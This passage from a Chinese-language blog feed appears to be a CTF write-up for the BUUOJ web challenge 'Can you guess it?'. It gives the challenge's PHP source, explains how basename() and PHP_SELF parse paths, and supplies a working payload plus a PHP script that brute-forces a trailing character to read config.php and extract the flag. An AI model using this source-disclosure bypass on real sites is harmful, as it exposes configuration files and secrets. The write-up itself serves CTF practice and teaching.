highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">  $guess = (string) $_POST[&#x27;guess&#x27;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message = &#x27;Wrong.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;If your guess is correct, I&#x27;ll give you the flag.&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">&lt;?php if (isset($message)) &#123; ?&gt;</span><br><span class="line">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php &#125; ?&gt;</span><br><span class="line">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;]` 表示当前 php 文件相对于网站[根目录]的位置地址，与 document root 相关</span><br><span class="line">下面是本地测试截图，也就是`http://.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;PHP_SELF&#x27;]</span><br><span class="line">即在url输入/index.php/config.php 会触发第一个if语句</span><br><span class="line"></span><br><span class="line">basename() 函数会返回路径中的文件名部分</span><br><span class="line">假如路径是/index.php/config.php</span><br><span class="line">浏览器的解析结果都是index.php</span><br><span class="line">而basename会返回config.php</span><br><span class="line">就算后面跟上多余的字符也会返回文件名部分</span><br><span class="line">如/index.php/config.php/?source返回config.php</span><br><span class="line">basename()会去掉文件名开头的非ASCII值。</span><br><span class="line"></span><br><span class="line">random_bytes(num)生成num个随机的字符，bin2hex(str)将字符转化为十六进制数方便我们观察，这里我就想到会不会是之前做过的一个题目，只要种子一样，随机数其实是定下来的，也就是所谓的伪随机数，这里还有一个比较函数hash_squals，比较两个字符串是否一样</span><br><span class="line">查完发现从这里突破的可能性较小</span><br></pre></td></tr></table></figure><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>漏洞点：hightlight_file,使路径名解析完是config.php，且绕过第一个if</p><p>绕过第一个if：只要不让解析完config.php是结尾就行,后面加上不可见字符或者其他汉字，中文字符都行——&gt;config.php&#x2F;%ff</p><p>第二个if只需要加上?source就行了</p><p>payload：index.php&#x2F;config.php&#x2F;文?source</p><p>PHP脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function check($str)</span><br><span class="line">&#123;</span><br><span class="line">    return preg_match(&quot;/config\.php\/*$/i&quot;, $str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for ($i = 0; $i &lt; 255; $i++) &#123;</span><br><span class="line">    $url = &quot;/index.php/config.php/&quot; . chr($i);</span><br><span class="line">    if (!check($url)) &#123;</span><br><span class="line">//       echo &quot;\n&quot;;</span><br><span class="line">//       echo $i.&quot;---&quot;.chr($i).&quot;---&quot;.basename($url);</span><br><span class="line">        if (basename($url) == &quot;config.php&quot;) &#123;</span><br><span class="line">            $furl = &quot;http://756d1e03-c817-450b-af4a-23928b5cbb3c.node4.buuoj.cn:81/index.php/config.php/&quot; . chr($i) . &quot;?source&quot;;</span><br><span class="line">//            echo $furl;</span><br><span class="line">            $html = file_get_contents(&quot;http://756d1e03-c817-450b-af4a-23928b5cbb3c.node4.buuoj.cn:81/index.php/config.php/&quot; . chr($i) . &quot;?source&quot;);</span><br><span class="line">            if (preg_match(&quot;/flag\&#123;.*?\&#125;/&quot;, $html, $flag))</span><br><span class="line">            &#123;</span><br><span class="line">                echo $i.&quot;\n&quot;;</span><br><span class="line">//                echo $html;</span><br><span class="line">//                print_r($flag);</span><br><span class="line">                echo $flag[0];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://blog.csdn.net/solitudi/article/details/108912334">https://blog.csdn.net/solitudi/article/details/108912334</a></p><p><a href="https://www.cnblogs.com/yesec/p/15429527.html">https://www.cnblogs.com/yesec/p/15429527.html</a></p><p><a href="https://blog.csdn.net/qq_54929891/article/details/123662382">https://blog.csdn.net/qq_54929891/article/details/123662382</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;源码&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;</summary>
      
    
    
    
    
    <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
    
  </entry>
  
</feed>
